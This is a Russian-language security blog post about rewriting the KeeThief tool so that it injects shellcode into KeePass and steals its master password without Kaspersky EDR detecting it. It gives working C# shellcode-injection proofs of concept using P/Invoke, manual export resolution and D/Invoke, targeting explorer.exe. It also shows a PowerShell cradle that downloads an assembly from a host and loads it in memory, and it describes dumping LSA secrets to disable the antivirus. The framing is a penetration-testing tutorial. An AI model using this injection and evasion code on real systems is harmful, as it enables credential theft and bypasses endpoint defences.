---
layout: post
title: "Вызов мастеру ключей. Инжектим шеллкод в память KeePass, обойдя антивирус"
date: 2022-06-01 01:30:00 +0300
author: snovvcrash
tags: [xakepru, maldev, shellcode-injection, dotnet, csharp, dynamic-invocation, dinovke, keethief, keetheft, keepass]
---

[//]: # (2022-03-29)

Недавно я столкнулся с ситуацией на пентесте, когда мне было необходимо вытащить мастер-пароль открытой базы данных KeePass из памяти процесса с помощью утилиты **KeeThief** из арсенала GhostPack. Все бы ничего, да вот EDR, следящий за системой, категорически не давал мне этого сделать – ведь под капотом KeeThief живет классическая процедура инъекции шеллкода в удаленный процесс, что не может остаться незамеченным в 2022 году. В этой статье мы рассмотрим замечательный сторонний механизм D/Invoke для C#, позволяющий эффективно дергать Windows API в обход средств защиты и перепишем KeeThief, чтобы его не ловил великий и ужасный «Касперский».

<!--cut-->

<p align="right">
    <a href="https://hackmag.com/coding/keethief/"><img src="https://img.shields.io/badge/F-HackMag-26a0c4?style=flat-square" alt="hackmag-badge.svg" /></a>
    <a href="https://xakep.ru/2022/03/31/keethief/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
</p>

![banner.png](/assets/images/keethief-syscalls/banner.png)
{:.center-image}

* TOC
{:toc}

# Предыстория

В общем, пребываю я на внутряке, домен админ уже пойман <strike>и наказан</strike>, но вот осталась одна вредная база данных KeePass, которая, конечно же, не захотелась сбрутаться с помощью hashcat и [`keepass2john.py`](https://gist.github.com/HarmJ0y/116fa1b559372804877e604d7d367bbc). В KeePass – доступы к критически важным ресурсам инфры, определяющим исход внутряка, поэтому добраться до нее **нужно**. На рабочей станции, где пользак крутит интересующую нас базу, глядит в оба Kaspersky Endpoint Security (он же KES), который не дает расслабиться. Рассмотрим, какие есть варианты получить желанный мастер-пароль без прибегания к социнженерии.

Прежде всего скажу, что успех этого предприятия – в обязательном использовании крутой малвари [KeeThief](https://github.com/GhostPack/KeeThief) из коллекции GhostPack авторства небезыствестных [@harmj0y](https://twitter.com/harmj0y) и [@tifkin_](https://twitter.com/tifkin_). Ядро программы – кастомный шеллкод, который вызывает [RtlDecryptMemory](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-rtldecryptmemory) в отношении зашифрованной области виртуальной памяти KeePass.exe и выдергивает оттуда наш мастер-пароль. Если есть шеллкод, нужен и загрузчик, и с этим возникают трудности, когда на хосте присутствует EDR...

Впрочем, мы отвлеклись, какие были варианты?

## Потушить AV

Самый простой (и не менее глупый) способ – вырубить к чертям «Касперского» на пару секунд. «Это не редтим, поэтому право имею!» – подумал я. Так как привилегии администратора домена есть, значит, есть и доступ к серверу администрирования KES. Следовательно, есть доступ и к учетке `KlScSvc` (в этом случае использовалась локальная УЗ), креды от которой хранятся среди секретов LSA в плейнтексте.

Порядок действий простой. Дампаю LSA с помощью [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py).

[![kes-secretsdump-py.png](/assets/images/keethief-syscalls/kes-secretsdump-py.png)](/assets/images/keethief-syscalls/kes-secretsdump-py.png)

Потрошим LSA
{:.quote}

Гружу консоль администрирования KES [с офицаильного сайта](https://www.kaspersky.ru/small-to-medium-business-security/downloads/endpoint) и логинюсь, указав хостнейм KSC.

[![kes-admin-console.png](/assets/images/keethief-syscalls/kes-admin-console.png)](/assets/images/keethief-syscalls/kes-admin-console.png)

Консоль администрирования KES
{:.quote}

Стопорю «Каспера» и делаю свои грязные делишки.

[![kes-keethief.png](/assets/images/keethief-syscalls/kes-keethief.png)](/assets/images/keethief-syscalls/kes-keethief.png)

AdobeHelperAgent.exe, ну вы поняли, ага
{:.quote}

Profit! Мастер-пароль у нас. После окончания проекта я опробовал другие способы решения этой задачи.

## Получить сессию C2

Многие [C2](https://attack.mitre.org/tactics/TA0011/)-фреймворки умеют тащить за собой DLL рантайма кода C# (Common Language Runtime, CLR) и загружать ее отраженно по принципу [RDI](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection) (Reflective DLL Injection) для запуска малвари из памяти. Теоретически это может повлиять на процесс отлова управляемого кода, исполняемого через такой трюк.

Полноценную сессию Meterpreter при активном антивирусе Касперского получить трудно из-за обилия артефактов в сетевом трафике, поэтому его [execute-assembly](https://github.com/b4rtik/metasploit-execute-assembly) я даже пробовать не стал. А вот модуль [execute-assembly](https://www.cobaltstrike.com/blog/cobalt-strike-3-11-the-snake-that-eats-its-tail/) Cobalt Strike принес свои результаты, если правильно получить сессию beacon (далее скриншоты будут с домашнего KIS, а не KES, но все техники работают и против последнего – проверено).

[![cs-execute-assembly.png](/assets/images/keethief-syscalls/cs-execute-assembly.png)](/assets/images/keethief-syscalls/cs-execute-assembly.png)

KeeTheft.exe с помощью execute-assembly CS
{:.quote}

Все козыри раскрывать не буду – мне еще работать пентестером, однако этот метод тоже не представляет большого интереса в нашей ситуации. Для гладкого получения сессия «маячка» нужен внешний сервак, на который нужно накрутить валидный сертификат для шифрования SSL-трафа, а заражать таким образом машину с **внутреннего** периметра заказчика — совсем не вежливо.

## Перепаять инструмент

Самый интересный и в то же время трудозатратный способ – переписать логику иъекции шеллкода таким образом, чтобы EDR не спалил в момент исполнения. Это то, ради чего мы сегодня собрались, но для начала немного теории.

Дело здесь именно в уклонении от эврестического анализа, так как если спрятать сигнатуру малвари с помощью недетектируемого упаковщика, доступ к памяти нам все равно будет запрещен из-за фейла инъекции.

[![kes-keethief-loader.png](/assets/images/keethief-syscalls/kes-keethief-loader.png)](/assets/images/keethief-syscalls/kes-keethief-loader.png)

Запуск криптованного KeeTheft.exe при активном EDR
{:.quote}

# Классическая инъекция шеллкода

Оглянемся назад и рассмотрим классическую технику внедрения стороннего кода в удаленный процесс. Для этого наши предки пользовались священным трио Win32 API:

* [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) – выделить место в виртуальной памяти удаленного процесса под наш шеллкод.
* [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) – записать байты шеллкода в выделенную область памяти.
* [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) – запустить новый поток в удаленном процессе, который стартует свежезаписанный шеллкод.

[![classic-shellcode-injection.png](/assets/images/keethief-syscalls/classic-shellcode-injection.png)](/assets/images/keethief-syscalls/classic-shellcode-injection.png)

Исполнение шеллкода с помощью Thread Execution (изображение — elastic.co)
{:.quote}

Напишем простой PoC на C#, демонстрирующий эту самую классическую инъекцию шеллкода.

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SimpleInjector
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        public static void Main()
        {
            // msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
            byte[] buf = new byte[] { };

            // получаем PID процесса explorer.exe
            int processId = Process.GetProcessesByName("explorer")[0].Id;

            // получаем хендл процесса по его PID (0x001F0FFF = PROCESS_ALL_ACCESS)
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);

            // выделяем область памяти 0x1000 байт (0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE)
            IntPtr allocAddr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // записываем шеллкод в выделенную область
            _ = WriteProcessMemory(hProcess, allocAddr, buf, buf.Length, out _);

            // запускаем поток
            _ = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocAddr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

Скомпилировав и запустив инжектор, с помощью Process Hacker можно наблюдать, как в процессе explorer.exe запустится новый поток, рисующий нам диалоговое окно MSF.

[![simple-injector.png](/assets/images/keethief-syscalls/simple-injector.png)](/assets/images/keethief-syscalls/simple-injector.png)

Классическая инъекция шеллкода
{:.quote}

Если просто положить такой бинарь на диск с активным средством антивирусной защиты, реакция будет незамедлительной независимо от содержимого массива `buf`, то есть нашего шеллкода. Все дело в комбинации потенциально опасных вызовов Win32 API, которые заведомо используются в большом количестве зловредов. Для демонстрации я перекомпилирую инжектор с пустым массивом `buf` и залью результат на VirusTotal. [Реакция](https://www.virustotal.com/gui/file/894aa4b908f51ec2202fffd1dd052716921ee1598a431b356a9a2c6c4a479367) ресурса говорит сама за себя.

[![simple-injector-virustotal.png](/assets/images/keethief-syscalls/simple-injector-virustotal.png)](/assets/images/keethief-syscalls/simple-injector-virustotal.png)

VirusTotal намекает...
{:.quote}

Как антивирусное ПО понимает, что перед ним инжектор, даже без динамического анализа? Все просто – пачка атрибутов `DllImport`, занимающих половину нашего исходника, кричит об этом на всю деревню. Например, с помощью такого волшебного кода на PowerShell я могу посмотреть все импорты в бинаре .NET.

Здесь используется сборка `System.Reflection.Metadata`, доступная «из коробки» в PowerShell Core. Процесс установки описан в [документации Microsoft](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows).

```powershell
$assembly = "C:\Users\snovvcrash\source\repos\SimpleInjector\bin\x64\Release\SimpleInjector.exe"
$stream = [System.IO.File]::OpenRead($assembly)
$peReader = [System.Reflection.PortableExecutable.PEReader]::new($stream, [System.Reflection.PortableExecutable.PEStreamOptions]::LeaveOpen -bor [System.Reflection.PortableExecutable.PEStreamOptions]::PrefetchMetadata)
$metadataReader = [System.Reflection.Metadata.PEReaderExtensions]::GetMetadataReader($peReader)
$assemblyDefinition = $metadataReader.GetAssemblyDefinition()

foreach($typeHandler in $metadataReader.TypeDefinitions) {
    $typeDef = $metadataReader.GetTypeDefinition($typeHandler)
    foreach($methodHandler in $typeDef.GetMethods()) {
        $methodDef = $metadataReader.GetMethodDefinition($methodHandler)

        $import = $methodDef.GetImport()
        if ($import.Module.IsNil) {
            continue
        }

        $dllImportFuncName = $metadataReader.GetString($import.Name)
        $dllImportParameters = $import.Attributes.ToString()
        $dllImportPath = $metadataReader.GetString($metadataReader.GetModuleReference($import.Module).Name)
        Write-Host "$dllImportPath, $dllImportParameters`n$dllImportFuncName`n"
    }
}
```

[![simple-injector-imports.png](/assets/images/keethief-syscalls/simple-injector-imports.png)](/assets/images/keethief-syscalls/simple-injector-imports.png)

Смотрим импорты в SimpleInjector.exe
{:.quote}

Эти импорты представляют собой способ взаимодействия приложений .NET с неуправляемым кодом – таким, как, например, функции библиотек `user32.dll`, `kernel32.dll` и другие. Этот механизм называется P/Invoke (Platform Invocation Services), а сами сигнатуры импортируемых функций с набором аргументов и типом возвращаемого значения можно найти на сайте [pinvoke.net](https://www.pinvoke.net/).

При анализе этого добра в динамике, как ты понимаешь, дела обстоят еще проще: так как все EDR имеют привычку вешать хуки на userland-интерфейсы, вызовы подозрительных API сразу поднимут тревогу. Подробнее об этом можно почитать в [ресерче](https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/) [@ShitSecure](https://twitter.com/ShitSecure), а в лабораторных условиях хукинг нагляднее всего продемонстрировать с помощью [API Monitor](http://www.rohitab.com/apimonitor).

[![simple-injector-apimonitor.png](/assets/images/keethief-syscalls/simple-injector-apimonitor.png)](/assets/images/keethief-syscalls/simple-injector-apimonitor.png)

Хукаем kernel32.dll в SimpleInjector.exe
{:.quote}

Итак, что же со всем этим делать?

# Введение в D/Invoke

В 2020 году исследователи [@TheWover](https://twitter.com/therealwover) и [@FuzzySecurity](https://twitter.com/fuzzysec) представили новый API для вызова неуправляемого кода из .NET – D/Invoke (Dynamic Invocation, по аналогии с P/Invoke). Этот способ основан на использовании мощного механизма [делегатов](https://docs.microsoft.com/ru-ru/dotnet/csharp/programming-guide/delegates/) в C# и изначально был доступен как часть фреймворка для разработки постэксплутационных тулз [SharpSploit](https://github.com/cobbr/SharpSploit), однако позже был вынесен в отдельный [репозиторий](https://github.com/TheWover/DInvoke), и даже [появлися](https://www.nuget.org/packages/DInvoke/) в виде сборки на NuGet.

С помощью делегатов разработчик может объявить ссылку на функцию, которую хочет вызвать, со всеми параметрами и типом возвращаемого значения, как и при использовании импорта с помощью атрибута `DllImport`. Разница в том, что в отличие от импорта с помощью `DllImport`, когда рутина поиска адреса импортируемых функций ложится на плечи исполняющей среды, при использовании делегатов мы должны самостоятельно локализовать интересующий нас неуправляемый код (динамически, в ходе выполнения программы) и ассоциировать его с объявленным указателем. Далее мы сможем обращаться к указателю, как к искомой функции, без необходимости «кричать» о том, что мы вообще собирались ее использовать.

D/Invoke предоставляет не один подход для динамического импорта неуправляемого кода, в том числе:

1. [DynamicAPIInvoke](https://github.com/TheWover/DInvoke/blob/0530886deebd1a2e5bd8b9eb8e1d8ce87f4ca5e4/DInvoke/DInvoke/DynamicInvoke/Generic.cs#L33) – парсит структуру DLL (причем может загружать ее как с диска, так и обращться к уже загруженному экземпляру в памяти текущего процесса), где размещена нужная функция, и вычисляет ее экспорт-адрес.
2. [GetSyscallStub](https://github.com/TheWover/DInvoke/blob/0530886deebd1a2e5bd8b9eb8e1d8ce87f4ca5e4/DInvoke/DInvoke/DynamicInvoke/Generic.cs#L806) – загружает в память бибилиотеку `ntdll.dll`, точно так же парсит ее структуру, чтобы в результате получить не что иное, как указатель на экспорт-адрес системного вызова – последней черты перед переходом в мир <strike>мёртвых</strike> kernel-mode (о системных вызовах поговорим чуть позже).

Чтобы было понятнее, разберем для начала простой пример, который делает нечто похожее на первый подход, но без использования D/Invoke.

## DynamicAPIInvoke без D/Invoke

Мне очень нравится пример из [статьи](https://blog.xpnsec.com/weird-ways-to-execute-dotnet/) [xpn](https://twitter.com/_xpn_) (второй листинг кода в разделе «A Quick History Lesson»), где он показывает, как можно использовать всю мощь делегатов вместе ручным поиском экспорт-адреса неуправляемой функции менее чем за 50 строк.

Переименуем функцию `StartShellcodeViaDelegate` в `Main`, добавим необходимые структуры (сигнатуры взяты с [pinvoke.net](http://www.pinvoke.net/)), и у нас готов следующий PoC для демонстрации динамической инъекции шеллкода.

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace DynamicAPIInvoke
{
    /// <summary>
    /// "A Quick History Lesson"
    /// https://blog.xpnsec.com/weird-ways-to-execute-dotnet/
    /// </summary>
    public class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate IntPtr ShellcodeDelegate();

        static IntPtr GetExportAddress(IntPtr baseAddr, string name)
        {
            var dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(baseAddr);
            var peHeader = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER64>(baseAddr + dosHeader.e_lfanew + 4 + Marshal.SizeOf<IMAGE_FILE_HEADER>());
            var exportHeader = Marshal.PtrToStructure<IMAGE_EXPORT_DIRECTORY>(baseAddr + (int)peHeader.ExportTable.VirtualAddress);

            for (int i = 0; i < exportHeader.NumberOfNames; i++)
            {
                var nameAddr = Marshal.ReadInt32(baseAddr + (int)exportHeader.AddressOfNames + (i * 4));
                var m = Marshal.PtrToStringAnsi(baseAddr + (int)nameAddr);
                if (m == "VirtualAlloc")
                {
                    var exportAddr = Marshal.ReadInt32(baseAddr + (int)exportHeader.AddressOfFunctions + (i * 4));
                    return baseAddr + (int)exportAddr;
                }
            }

            return IntPtr.Zero;
        }

        public static void Main()
        {
            // msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
            byte[] shellcode = new byte[] { };

            // ищем экспорт-адрес из уже загруженной в память библиотеки kernel32.dll
            IntPtr virtualAllocAddr = IntPtr.Zero;
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                if (module.ModuleName.ToLower() == "kernel32.dll")
                    virtualAllocAddr = GetExportAddress(module.BaseAddress, "VirtualAlloc");

            // инициализируем делегат найденным адресом
            var VirtualAlloc = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(virtualAllocAddr);

            // выделяем область памяти shellcode.Length байт в адресном пространстве текущего процесса инжектора (0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE)
            var execMem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

            // записываем шеллкод в выделенную область
            Marshal.Copy(shellcode, 0, execMem, shellcode.Length);

            // обращаемся к шеллкоду как к функции и запускаем его без создания нового потока
            var shellcodeCall = Marshal.GetDelegateForFunctionPointer<ShellcodeDelegate>(execMem);
            shellcodeCall();
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DOS_HEADER
        {
            // http://www.pinvoke.net/default.aspx/Structures/IMAGE_DOS_HEADER.html
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_OPTIONAL_HEADER64
        {
            // http://www.pinvoke.net/default.aspx/Structures/IMAGE_OPTIONAL_HEADER64.html
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DATA_DIRECTORY
        {
            // http://www.pinvoke.net/default.aspx/Structures/IMAGE_DATA_DIRECTORY.html
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_FILE_HEADER
        {
            // http://www.pinvoke.net/default.aspx/Structures/IMAGE_FILE_HEADER.html
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_EXPORT_DIRECTORY
        {
            // http://www.pinvoke.net/default.aspx/Structures/IMAGE_EXPORT_DIRECTORY.html
        }
    }
}
```

[![dynamicapiinvoke.png](/assets/images/keethief-syscalls/dynamicapiinvoke.png)](/assets/images/keethief-syscalls/dynamicapiinvoke.png)

DynamicAPIInvoke без D/Invoke
{:.quote}

В этом примере для простоты используется так называемая self-инъекция, когда мы целимся не в удаленный процесс, а записываем шеллкод в виртуальную память процесса самого инжектора (к слову, это тоже годная тактика байпаса AV).

Посмотрим, есть ли подозрительные импорты с помощью нашего импровизированного скрипта для статического анализа.

[![dynamicapiinvoke-imports.png](/assets/images/keethief-syscalls/dynamicapiinvoke-imports.png)](/assets/images/keethief-syscalls/dynamicapiinvoke-imports.png)

Смотрим импорты в DynamicAPIInvoke.exe
{:.quote}

Импортов не найдено, все по плану. А что скажет API Monitor при запуске инжектора?

[![dynamicapiinvoke-apimonitor.png](/assets/images/keethief-syscalls/dynamicapiinvoke-apimonitor.png)](/assets/images/keethief-syscalls/dynamicapiinvoke-apimonitor.png)

Хукаем kernel32.dll в DynamicAPIInvoke.exe
{:.quote}

Тоже по нулям. Проверим реакцию KIS на этот бинарь.

[![dynamicapiinvoke-kis.png](/assets/images/keethief-syscalls/dynamicapiinvoke-kis.png)](/assets/images/keethief-syscalls/dynamicapiinvoke-kis.png)

«Касперский» недоволен DynamicAPIInvoke.exe
{:.quote}

Даже не успел запустить... Но мы движемся в правильном направлении!

На самом деле, в этом случае «Каспер» палит еще и захардкоженные строки (например, `"VirtualAlloc"`) и имена переменных. Если их обфусцировать или зашифровать, как я делаю вот [тут](https://gist.github.com/snovvcrash/35773330434e738bd86155894338ba4f), мы останемся вне зоне видимости радаров EDR.

[![dynamicapiinvoke-kis-bypass.png](/assets/images/keethief-syscalls/dynamicapiinvoke-kis-bypass.png)](/assets/images/keethief-syscalls/dynamicapiinvoke-kis-bypass.png)

Как тебе такое, Касперский?!
{:.quote}

Однако, спойлер: при более сложной схеме инжектора, как например, запуск потока в удаленном процессе, нас все равно спалят на эвристике. Следовательно, для нашей задачи этот метод не подойдет.

## DynamicAPIInvoke с помощью D/Invoke

Рассмотрим, как реализовать инъекцию в удаленный процесс с помощью D/Invoke и `DynamicAPIInvoke`. Для этого создадим новый проект Visual Studio и отдельно клонируем репозиторий D/Invoke. Для «боевых» операций я бы не стал пользоваться готовым пакетом NuGet, а включил бы **сорцы** D/Invoke в свой проект, чтобы избежать потенциальных IOC и не мучиться с объединением сборок в одну.

```bash
git clone https://github.com/TheWover/DInvoke.git
```

Должно получиться что-то вроде этого.

[![di-dynamicapiinvoke-project-tree.png](/assets/images/keethief-syscalls/di-dynamicapiinvoke-project-tree.png)](/assets/images/keethief-syscalls/di-dynamicapiinvoke-project-tree.png)

Структура проекта DInvoke_DynamicAPIInvoke
{:.quote}

А вот содержимое самого PoC.

```csharp
using System;
using System.Diagnostics;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace DInvoke_DynamicAPIInvoke
{
    class Delegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenProcess(
            DInvoke.Data.Win32.Kernel32.ProcessAccessFlags dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);
    }

    public class Program
    {
        static IntPtr OpenProcess(DInvoke.Data.Win32.Kernel32.ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId)
        {
            object[] parameters = { dwDesiredAccess, bInheritHandle, dwProcessId };
            var result = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(Delegates.OpenProcess), ref parameters);

            return result;
        }

        static IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            object[] parameters = { hProcess, lpAddress, dwSize, flAllocationType, flProtect };
            var result = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "VirtualAllocEx", typeof(Delegates.VirtualAllocEx), ref parameters);

            return result;
        }

        static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten)
        {
            var numBytes = new IntPtr();

            object[] parameters = { hProcess, lpBaseAddress, lpBuffer, nSize, numBytes };
            var result = (bool)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "WriteProcessMemory", typeof(Delegates.WriteProcessMemory), ref parameters);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpNumberOfBytesWritten = (IntPtr)parameters[4];

            return result;
        }

        static IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            object[] parameters = { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            var result = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CreateRemoteThread", typeof(Delegates.CreateRemoteThread), ref parameters);

            return result;
        }

        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
            byte[] buf = new byte[] { };

            // получаем PID процесса explorer.exe
            int processId = Process.GetProcessesByName("explorer")[0].Id;

            // получаем хендл процесса по его PID
            IntPtr hProcess = OpenProcess(DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, processId);

            // выделяем область памяти buf.Length байт
            IntPtr allocAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);

            // записываем шеллкод в выделенную область
            _ = WriteProcessMemory(hProcess, allocAddr, buf, buf.Length, out _);

            // запускаем поток
            _ = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocAddr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

[![di-dynamicapiinvoke.png](/assets/images/keethief-syscalls/di-dynamicapiinvoke.png)](/assets/images/keethief-syscalls/di-dynamicapiinvoke.png)

DynamicAPIInvoke с помощью D/Invoke
{:.quote}

Обсудим вкратце, что здесь произошло. Для примера возьмем API-вызов `WriteProcessMemory`. В случае статического импорта P/Invoke использование этого API выглядело так.

```csharp
public class Program
{
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten);
}
```

При использовании DynamicAPIInvoke из D/Invoke я создал функцию-враппер `WriteProcessMemory`, принимающую те же аргументы, которые указаны в сигнатуре делегата, и передающую управление логике D/Invoke.

```csharp
class Delegates
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);
}

public class Program
{
    static bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten)
    {
        // эта переменная будет отвечать за out-аргумент lpNumberOfBytesWritten
        var numBytes = new IntPtr();

        // сооружаем объект, содержащий входящие аргументы, который будет передан целевой функции, и вызываем DynamicAPIInvoke
        object[] parameters = { hProcess, lpBaseAddress, lpBuffer, nSize, numBytes };
        var result = (bool)DInvoke.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "WriteProcessMemory", typeof(Delegates.WriteProcessMemory), ref parameters);

        // в случае неудачи бросаем исключение, иначе – переопределяем out-аргумент lpNumberOfBytesWritten значением numBytes
        if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
        lpNumberOfBytesWritten = (IntPtr)parameters[4];

        // возвращаем результат
        return result;
    }
}
```

Это сделано, чтобы упростить использование целевой функции: синтаксис обращения к `WriteProcessMemory` в обоих случаях остается одинаковым:

```csharp
_ = WriteProcessMemory(hProcess, allocAddr, buf, buf.Length, out _);
```

Теперь важный момент: если мы решили пользоваться проектом D/Invoke, забываем о том, что бинарь можно положить на диск (посыпятся алерты). Но это не страшно, ведь это C#, а значит, всегда можно загрузить байты собранного инжектора прямо в память с помощью `System.Reflection.Assembly` (помним о том, что класс с точкой входа программы должен быть объявлен как `public`, равно как и функция `Main`).

Про загрузку сборок C# в память тоже есть несколько интересных статей:

- [Running a .NET Assembly in Memory with Meterpreter](https://www.praetorian.com/blog/running-a-net-assembly-in-memory-with-meterpreter/)
- [PowerShell load .Net Assembly](https://pscustomobject.github.io/powershell/howto/PowerShell-Add-Assembly/)
- [Converting C# Tools to PowerShell](https://icyguider.github.io/2022/01/03/Convert-CSharp-Tools-To-PowerShell.html)

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.184/DInvoke_DynamicAPIInvoke.exe')
$assembly = [System.Reflection.Assembly]::Load($data)
$a = [DInvoke_DynamicAPIInvoke.Program]::Main(" ")
```

[![di-dynamicapiinvoke-kis.png](/assets/images/keethief-syscalls/di-dynamicapiinvoke-kis.png)](/assets/images/keethief-syscalls/di-dynamicapiinvoke-kis.png)

И снова мы ему не угодили
{:.quote}

Но ох и ах, и это поведение детектится «Касперским» при выполнении. Мы были к этому готовы, поэтому перейдем к тяжелой артилерии – систмным вызовам в D/Invoke.

## Зачем системные вызовы?

Итак, вкратце, что такое системные вызовы в контексте нашей темы и почему их использование может как-то помочь в сложившейся ситуации?

В Windows существует два вида API: Win32 API и Native API.

1. Win32 API (`kernel32.dll`, `user32.dll`, `advapi32.dll` и другие) – документированный и понятный API, который годами остается нетронутым, чтобы не ломать уже написанные программы и не заставлять разработчиков заново изобретать велосипед, когда им нужна реализация базовых вещей. Грубо говоря, функции Win32 API — это функции-обертки, которые внутри обращаются к Native API (примерно так же, как и наш пример с `DynamicAPIInvoke` выше).
2. Native API (`ntdll.dll`) – недокументированный <strike>и непонятный</strike> API, реализация которого может меняться от версии к версии Windows. Функции Native API в свою очередь — это обертки для системных вызовов.

[![user-mode-kernel-mode.png](/assets/images/keethief-syscalls/user-mode-kernel-mode.png)](/assets/images/keethief-syscalls/user-mode-kernel-mode.png)

Архитектура Windows (изображение — jhalon.github.io)
{:.quote}

